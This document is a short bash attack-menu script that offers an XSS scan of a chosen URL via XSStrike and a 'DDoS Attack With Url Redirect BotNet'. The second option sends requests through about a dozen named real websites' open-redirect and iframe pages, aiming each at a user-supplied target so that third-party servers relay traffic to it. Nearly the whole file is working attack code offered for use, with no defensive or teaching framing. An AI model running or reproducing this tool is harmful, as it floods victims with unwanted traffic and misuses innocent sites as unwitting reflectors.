cyan='\e[0;36m' 
green='\033[92m' 
red='\e[1;31m' 
yel='\e[0;33m' 
orange='\e[38;5;166m'

figlet "Site" |lolcat 
figlet "Attacks" |lolcat 
figlet "Menu" |lolcat 
echo -e $green"========================"
echo -e $yel"1)XSS Scan-Attack"
echo -e $yel"2)DDoS Attack With Url Redirect BotNet"
echo -e $yel"3)Exit"
echo -e $green"========================"

read -p " [<Attacks>] " attacks
if [ $attacks = "1" ] 
then
clear
figlet "XSS" |lolcat 
read -p " [>Target-Url<] " target1 
cd $HOME/XSStrike/
python3 xsstrike.py -u $target1 
fi

if [ $attacks = "2" ]
then
clear
figlet "URL BotNet" |lolcat 
read -p " [<Target-Ip/URL>] " target2 
echo -e $red"[+]Starting..."

links http://loycetranchant.com/wp-content/themes/dt-chocolate/like_window.php?img=$target2 
links http://khalilyassirphotos.com/wp-content/themes/dt-chocolate/like_window.php?img=$target2 
links http://www.berthoud.com/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=$target2 
links http://www.iris.edu/hq/accounting/login?redir=$target2 
links http://www.karimbenamor.com/goto/index.asp?goto=$target2
links http://whoiswrong.com/user/login/redir/$target2
links http://ipdt.pt/?p=login&redir=$target2 
links http://www.isagri.pt/BibliRessources/PagesSystem/IFramePage.aspx?PageUrl=$target2 
links http://www.zanzana.net/goto.asp?goto=$target2 
links http://latinamerica.brother.com/LeavingOurSite.aspx?GoTo=$target2 
links http://jescobedo.com/wp-content/themes/dt-chocolate/like_window.php?img=$target2 
links http://it.groupeisa.com/BibliRessources/PagesSystem/IFrame=$target2

fi
